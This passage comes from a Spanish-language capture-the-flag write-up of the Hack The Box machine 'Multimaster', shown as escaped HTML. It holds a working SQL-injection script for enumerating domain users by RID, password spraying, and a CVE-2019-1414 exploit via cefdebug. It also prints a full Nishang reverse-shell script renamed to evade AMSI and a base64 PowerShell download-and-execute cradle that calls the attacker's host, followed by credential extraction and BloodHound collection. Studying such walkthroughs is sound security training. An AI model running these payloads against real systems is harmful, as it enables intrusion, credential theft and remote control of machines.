        &quot;src&quot;: &quot;5&quot;
    }
]
&amp;gt;  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora con una query especifica vamos a lista el SID y RID correspondiente al usuario &lt;code&gt;Administrator&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;SID Y RID: El Identificador Relativo (RID) es parte del Identificador de Seguridad (SID) en los dominios de Microsoft Windows. Es la parte del SID que identifica a un principal de seguridad (un usuario, grupo o equipo) en relación con la autoridad que expidió el SID.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;gt; testt' union select 1,(select sys.fn_varbintohexstr(SUSER_SID('MEGACORP\Administrator'))),3,4,5-- -
[
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
        &quot;src&quot;: &quot;5&quot;
    }
]
&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;De el resultado que nos reporta los ultimos 8 caracteres corresponden  al RDI, que viene a estar representado en hexadecimal si lo tratamos un poco.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
&amp;gt;&amp;gt;&amp;gt; 0x01f4
500
&amp;gt;&amp;gt;&amp;gt; hex(500)
'0x1f4'
&amp;gt;&amp;gt;&amp;gt; hex(501)
'0x1f5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si modificamos el rdi con el valor hexadecimal de &lt;code&gt;501&lt;/code&gt;, entonces correspondera a otro usuario, en este caso &lt;code&gt;Ghest&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;gt; test' union select 1,(select SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f5010000)),3,4,5-- -
[
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;MEGACORP\\Guest&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
        &quot;src&quot;: &quot;5&quot;
    }
]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esto nos da la idea que podemos lista los usuarios del &lt;code&gt;DC&lt;/code&gt; a partir de poder conmutar el &lt;code&gt;RID&lt;/code&gt;, para ello en vez de hacerlo uno por uno, vamos a modificar un poco el script que ya teniamos para gestionarlo mejor.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/python3

from pwn import *
import requests, time, json, signal

def def_handler(sig, frame):
    print(&quot;\n[!] Saliendo...!\n&quot;)
    sys.exit(1)

#ctrl_c
signal.signal(signal.SIGINT, def_handler)

#global_variables
main_url = &quot;http://10.10.10.179/api/getColleagues&quot;
sid = &quot;0x0105000000000005150000001c00d1bcd181f1492bdfc236&quot;

#tratamos la data
def recivesql(sqlinyection):
    sqlmodified = &quot;&quot;
    for character in sqlinyection:
        sqlmodified += &quot;\\u00&quot; + hex(ord(character))[2:]

    return sqlmodified

#enviamos la data procesada
def sendsql(sqlmodified):

    headers = {
        'Content-Type': 'application/json;charset=utf-8'
    }

    data_post = '{&quot;name&quot;: &quot;%s&quot;}' % sqlmodified
    
    
    r = requests.post(main_url, headers=headers, data=data_post)

    data_json = json.loads(r.text)

    return (json.dumps(data_json,indent=4))

#obtebemos el RID en el formato adecuado
def getRID(i):
    cadena = hex(i).replace(&quot;x&quot;,&quot;&quot;)
    lista = []
    for caracter in cadena:
        lista.append(caracter)
    rid = lista[2] + lista[3] + lista[0] +lista[1] + &quot;0000&quot;

    return rid

if __name__ == '__main__':

#establecemos un rango que casi siempre corresponden a los usuarios
    for i in range(1100, 1200):
        rid = getRID(i)
        sqli = &quot;ttest' union select 1,(select SUSER_SNAME(%s%s)),3,4,5-- -&quot; % (sid, rid)
        sqlmodified = recivesql(sqli)
        response_json = sendsql(sqlmodified)

        print(response_json)
    
        time.sleep(2)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez ejecutamos el script despues de un breve momento obtenemos nuevos usuarios.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;❯ python3 sql_inject.py
[
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
        &quot;src&quot;: &quot;5&quot;
    }
]
[
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;MEGACORP\\DnsAdmins&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
        &quot;src&quot;: &quot;5&quot;
    }
]
[
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;MEGACORP\\DnsUpdateProxy&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
        &quot;src&quot;: &quot;5&quot;
    }
]
[
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;MEGACORP\\svc-nas&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
        &quot;src&quot;: &quot;5&quot;
    }
]
[
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;MEGACORP\\Privileged IT Accounts&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
        &quot;src&quot;: &quot;5&quot;
    }
]
[
    
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;MEGACORP\\tushikikatomo&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
        &quot;src&quot;: &quot;5&quot;
    }
]
[
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;MEGACORP\\andrew&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
        &quot;src&quot;: &quot;5&quot;
    }
]
[
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;MEGACORP\\lana&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
        &quot;src&quot;: &quot;5&quot;
    }
]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Con estos nuevos usuarios validamos con &lt;code&gt;crackmapexec&lt;/code&gt; y esta vez obtenemos unas credenciales validas correspondiente al usuario &lt;code&gt;tushikikatomo&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.179 -u users.txt -p passwords --continue-on-success
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\tushikikatomo:finance1 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\lana:password1 STATUS_LOGON_FAILURE
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como antes &lt;code&gt;nmap&lt;/code&gt; nos reporto que el puerto &lt;code&gt;5985&lt;/code&gt; estaba abierto intentaremos conectarnos con estas credenciales con &lt;code&gt;evil-winrm&lt;/code&gt;y visualizamos la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.10.179 -u 'tushikikatomo' -p 'finance1'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\alcibiades\Documents&amp;gt; cd ..\Desktop
*Evil-WinRM* PS C:\Users\alcibiades\Desktop&amp;gt; type user.txt
9d5ca88b1cafe75450e0b7a7b03c7834
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Enumerando un poco el sistema encontramos que se ejecuta el proceso &lt;code&gt;Code&lt;/code&gt; correspondiente a &lt;code&gt;Visual Code&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;*Evil-WinRM* PS C:\Users\alcibiades\Desktop&amp;gt; Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    277      51    57564      74188               652   1 Code
    576      39    30472      72024              1212   1 Code
    403      53    96468     122704              5464   1 Code
    315      31    37032      62272              5576   1 Code
    397      21    16804      23172              5836   1 Code
    194      15     6112      12432              6056   1 Code
     63       4      708       3532              5832   0 CompatTelRunner
     93       8     1308       5884              4092   0 conhost
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a la ruta, lo ejecutamos con el panel de ayuda y y este nos devuelve su version.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;*Evil-WinRM* PS C:\Program Files\Microsoft VS Code\bin&amp;gt; .\code -h
Visual Studio Code 1.37.1

Usage: code.exe [options][paths...]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de realizar una busqueda encontramos el &lt;code&gt;CVE-2019-1414&lt;/code&gt; asociado a esta version para elevegar privilegios a traves de la exposicion de un debug listener.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Multimaster/multi7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Mayor detalle en el articulo a continuacion:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://iwantmore.pizza/posts/cve-2019-1414.html&quot;&gt;https://iwantmore.pizza/posts/cve-2019-1414.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Usaremos la herramienta &lt;code&gt;cefdebug&lt;/code&gt; de github para explotar esta vulnerabilidad&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/taviso/cefdebug&quot;&gt;https://github.com/taviso/cefdebug&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Nos descargamos el ejecutable y lo subimos a la maquina victima en este caso lo hare con un recurso compartido, pero se puede hacer de muchas maneras.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;*Evil-WinRM* PS C:\WIndows\Temp\Priv&amp;gt; copy \\10.10.16.6\smbFolder\ceffdebug.exe ceffdebug.exe
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para ejecutarlo solo debemos seguir los pasos tal cual el repositorio.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;*Evil-WinRM* PS C:\WIndows\Temp\Priv&amp;gt; .\ceffdebug.exe
ceffdebug.exe : [2023/04/02 09:05:12:5013] U: There are 6 tcp sockets in state listen.
    + CategoryInfo          : NotSpecified: ([2023/04/02 09:...n state listen.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[2023/04/02 09:05:32:5800] U: There were 4 servers that appear to be CEF debuggers.
[2023/04/02 09:05:32:5800] U: ws://127.0.0.1:11996/b1874235-1857-4869-9ded-b35ae9c0f43d
[2023/04/02 09:05:32:5800] U: ws://127.0.0.1:52031/ef49c60c-66f9-448b-82a9-b08dc1a07022
[2023/04/02 09:05:32:5800] U: ws://127.0.0.1:24483/2f82f71d-03eb-4e62-ae62-8e8cd1a041c1
[2023/04/02 09:05:32:5800] U: ws://127.0.0.1:43978/c8928169-15af-4124-83a5-42b180e1b697
*Evil-WinRM* PS C:\WIndows\Temp\Priv&amp;gt; .\ceffdebug.exe --url ws://127.0.0.1:24483/2f82f71d-03eb-4e62-ae62-8e8cd1a041c1 --code &quot;process.mainModule.require('child_process').exec('ping 10.10.16.6')&quot;
ceffdebug.exe : [2023/04/02 09:05:58:8202] U: &amp;gt;&amp;gt;&amp;gt; process.mainModule.require('child_process').exec('ping 10.10.16.6')
    + CategoryInfo          : NotSpecified: ([2023/04/02 09:...ng 10.10.16.6'):String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[2023/04/02 09:05:58:8202] U: &amp;lt;&amp;lt;&amp;lt; ChildProcess
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y al ponernos en escucha con &lt;code&gt;tcpdump&lt;/code&gt; recibimos la traza &lt;code&gt;icmp&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ tcpdump -i tun0 -n icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
15:59:01.108853 IP 10.10.10.179 &amp;gt; 10.10.16.6: ICMP echo request, id 1, seq 1, length 40
15:59:01.108917 IP 10.10.16.6 &amp;gt; 10.10.10.179: ICMP echo reply, id 1, seq 1, length 40
15:59:02.150656 IP 10.10.10.179 &amp;gt; 10.10.16.6: ICMP echo request, id 1, seq 2, length 40
15:59:02.150666 IP 10.10.16.6 &amp;gt; 10.10.10.179: ICMP echo reply, id 1, seq 2, length 40
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo siguiente sera ganar acceso a traves de una consola interactiva, para ello usaremos el script &lt;code&gt;Invoke-PowerShellTcp.ps1&lt;/code&gt; del repositorio de &lt;code&gt;nishang&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/samratashok/nishang&quot;&gt;https://github.com/samratashok/nishang&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ahora para poder realizar &lt;code&gt;AMSI bypass&lt;/code&gt;, debemos editar el script cambiando el nombre de la funcion y borrando los comentarios para evitar problemas en la ejecucion.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;function dalecontodo 
{ 
    [CmdletBinding(DefaultParameterSetName=&quot;reverse&quot;)] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName=&quot;reverse&quot;)]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName=&quot;bind&quot;)]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=&quot;reverse&quot;)]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=&quot;bind&quot;)]
        [Int]
        $Port,

        [Parameter(ParameterSetName=&quot;reverse&quot;)]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName=&quot;bind&quot;)]
        [Switch]
        $Bind

    )

    
    try 
    {
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        $sendbytes = ([text.encoding]::ASCII).GetBytes(&quot;Windows PowerShell running as user &quot; + $env:username + &quot; on &quot; + $env:computername + &quot;`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n&quot;)
        $stream.Write($sendbytes,0,$sendbytes.Length)

        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '&amp;gt;')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                $sendback = (Invoke-Expression -Command $data 2&amp;gt;&amp;amp;1 | Out-String )
            }
            catch
            {
                Write-Warning &quot;Something went wrong with execution of command on the target.&quot; 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '&amp;gt; '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning &quot;Something went wrong! Check if the server is reachable and you are using the correct port.&quot; 
        Write-Error $_
    }
}
dalecontodo -Reverse -IPAddress 10.10.16.3 -Port 443
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;En la maquina victima ejecutaremos una peticion al script con &lt;code&gt;Iex&lt;/code&gt; para que nos lo interprete, pero antes debemos hacerlo en un formato que windows entienda. Para ello usaremos &lt;code&gt;iconv&lt;/code&gt; y lo transformaremos  a &lt;code&gt;base64&lt;/code&gt; de este modo poder ejecutar la peticion con &lt;code&gt;powershell&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo -n &quot;IEX(New-Object Net.WebClient).downloadString('http://10.10.16.3/PS.ps1')&quot; | iconv -t utf-16le | base64 -w 0; echo
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADMALwBQAFMALgBwAHMAMQAnACkA
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Teniendo el formato adecuando podemos pasar a ejecutar el &lt;code&gt;cefdebug&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Compartimos el &lt;code&gt;PS.ps1&lt;/code&gt; y seguidamente con &lt;code&gt;rlwrap&lt;/code&gt; y &lt;code&gt;ntcat&lt;/code&gt; ponernos en escucha.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.179 - - [02/Apr/2023 16:23:11] &quot;GET /PS.ps1 HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;*Evil-WinRM* PS C:\WIndows\Temp\Priv&amp;gt; .\ceffdebug.exe
ceffdebug.exe : [2023/04/02 09:28:38:6062] U: There are 3 tcp sockets in state listen.
    + CategoryInfo          : NotSpecified: ([2023/04/02 09:...n state listen.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[2023/04/02 09:28:58:6598] U: There were 1 servers that appear to be CEF debuggers.
[2023/04/02 09:28:58:6618] U: ws://127.0.0.1:16034/d18406c9-66d7-41ff-946f-3f2a9b0eabfe

*Evil-WinRM* PS C:\WIndows\Temp\Priv&amp;gt; .\ceffdebug.exe --url ws://127.0.0.1:16034/d18406c9-66d7-41ff-946f-3f2a9b0eabfe --code &quot;process.mainModule.require('child_process').exec('powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADYALwBQAFMALgBwAHMAMQAnACkA')&quot;
ceffdebug.exe : [2023/04/02 09:30:09:1259] U: &amp;gt;&amp;gt;&amp;gt; process.mainModule.require('child_process').exec('powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADYALwBQAFMALgBwA...
    + CategoryInfo          : NotSpecified: ([2023/04/02 09:...wBQAFMALgBwA...:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[2023/04/02 09:30:09:1269] U: &amp;lt;&amp;lt;&amp;lt; ChildProcess
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;y recimos una consola como el usuario &lt;code&gt;cyork&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rlwrap ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.179.
Ncat: Connection from 10.10.10.179:50183.
Windows PowerShell running as user cyork on MULTIMASTER
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

whoami
megacorp\cyork
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Listando los grupos del usuario, vemos que pertenece al grupo &lt;code&gt;Developers&lt;/code&gt;; este grupo tiene acceso al directorio &lt;code&gt;inetpub\wwwroot&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Dentro encontramos archivos &lt;code&gt;dll&lt;/code&gt;, concretamente un archivo de nombre &lt;code&gt;MultimasterAPI.dll&lt;/code&gt; que procederemos a traernos a nuestra maquina.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;dir
    Directory: C:\inetpub\wwwroot\bin


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----         1/7/2020   9:28 PM                roslyn                                                                
-a----        2/21/2013   7:13 PM         102912 Antlr3.Runtime.dll                                                    
-a----        2/21/2013   7:13 PM         431616 Antlr3.Runtime.pdb                                                    
-a----        5/24/2018   1:08 AM          40080 Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll                
-a----        7/24/2012  11:18 PM          45416 Microsoft.Web.Infrastructure.dll                                      
-a----         1/9/2020   4:13 AM          13824 MultimasterAPI.dll                                                    
-a----         1/9/2020   4:13 AM          28160 MultimasterAPI.pdb                                                    
-a----        2/17/2018   8:14 PM         664576 Newtonsoft.Json.dll                                                   
-a----       11/27/2018  11:30 PM         178808 System.Net.Http.Formatting.dll                                        
-a----       11/27/2018  11:28 PM          27768 System.Web.Cors.dll                                                   
-a----        1/27/2015   2:34 PM         139976 System.Web.Helpers.dll                                                
-a----       11/27/2018  11:31 PM          39352 System.Web.Http.Cors.dll                                              
-a----       11/27/2018  11:31 PM         455096 System.Web.Http.dll                                                   
-a----        1/31/2018  10:49 PM          77520 System.Web.Http.WebHost.dll                                           
-a----        1/27/2015   2:32 PM         566472 System.Web.Mvc.dll                                                    
-a----        2/11/2014   1:56 AM          70864 System.Web.Optimization.dll                                           
-a----        1/27/2015   2:32 PM         272072 System.Web.Razor.dll                                                  
-a----        1/27/2015   2:34 PM          41672 System.Web.WebPages.Deployment.dll                                    
-a----        1/27/2015   2:34 PM         211656 System.Web.WebPages.dll                                               
-a----        1/27/2015   2:34 PM          39624 System.Web.WebPages.Razor.dll                                         
-a----        7/17/2013   4:33 AM        1276568 WebGrease.dll                                                         
PS C:\inetpub\wwwroot\bin&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos la lista de caracteres imprimibles con &lt;code&gt;strings&lt;/code&gt;, pero al ser un ejecutable de windows usaremos el parametro &lt;code&gt;-e l&lt;/code&gt; para que nos liste mayor informacion.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ strings -e l MultimasterAPI.dll
FROM
WHERE
LIKE
INFORMATION_SCHEMA
MASTER
{ &quot;info&quot; : &quot;MegaCorp API&quot; }
application/json
server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos una nueva contraseña y volveremos a validarla con &lt;code&gt;crackmapexec&lt;/code&gt; si corrsponde a otro usuario.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.179 -u users.txt -p 'D3veL0pM3nT!' --continue-on-success
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\lana:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\andrew:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\sbauer:D3veL0pM3nT!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Con estas nuevas credenciales nos volvemos a conectar con &lt;code&gt;evil-winrm&lt;/code&gt; y tendriamos acceso esta vez como &lt;code&gt;sbauer&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.10.179 -u 'sbauer' -p 'D3veL0pM3nT!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sbauer\Documents&amp;gt; whoami
megacorp\sbauer
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Seguidamente subiremos el ejecutable &lt;code&gt;sharphound.exe&lt;/code&gt; para recopilar datos de &lt;code&gt;DC&lt;/code&gt; que posteriormente con &lt;code&gt;bloodhound&lt;/code&gt; interpretaremos.&lt;/p&gt;

&lt;p&gt;Una vez tengamos el archivo en la maquina victima lo ejecutamos y este nos generara un archivo &lt;code&gt;.zip&lt;/code&gt; que abriremos en &lt;code&gt;bloodhound&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;*Evil-WinRM* PS C:\WIndows\Temp\Privesc&amp;gt; .\SharpHound.exe -c All
2023-04-02T09:45:51.8354209-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2023-04-02T09:45:51.9916814-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote

*Evil-WinRM* PS C:\WIndows\Temp\Privesc&amp;gt; dir


    Directory: C:\WIndows\Temp\Privesc


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/2/2023   9:47 AM          14062 20230402094551_BloodHound.zip
-a----         8/3/2022   9:21 AM        1060864 SharpHound.exe
-a----         4/2/2023   9:47 AM          13225 YThiODEyNWUtMTcwMC00YWY2LTgwZmYtNmIxMWU0MTM4ZDg5.bin
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Subimos el &lt;code&gt;.zip&lt;/code&gt; a bloodhound&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Multimaster/multi8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;marcamos al usuario &lt;code&gt;sbauer&lt;/code&gt; como &lt;code&gt;User as owned&lt;/code&gt; y en analisys pinchamos en la opcion &lt;code&gt;Shortest Paths form Owned Principals&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Multimaster/multi11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observamos que el usuario &lt;code&gt;sbauer&lt;/code&gt; tiene el privilegio &lt;code&gt;Generic Write&lt;/code&gt; sobre el usuario &lt;code&gt;Jorden&lt;/code&gt; quien a su vez forma parte del grupo &lt;code&gt;Server Operators&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Multimaster/multi12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;GenericWrite - actualizar los atributos del objeto (por ejemplo, script de inicio de sesión)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Aprovecharemos el &lt;code&gt;Generic Write&lt;/code&gt; para setear la propiedad &lt;code&gt;dont require Kerberos preauthentication&lt;/code&gt; y con esto hacer al usuario &lt;code&gt;ASREPRoasteable&lt;/code&gt;&lt;/p&gt;

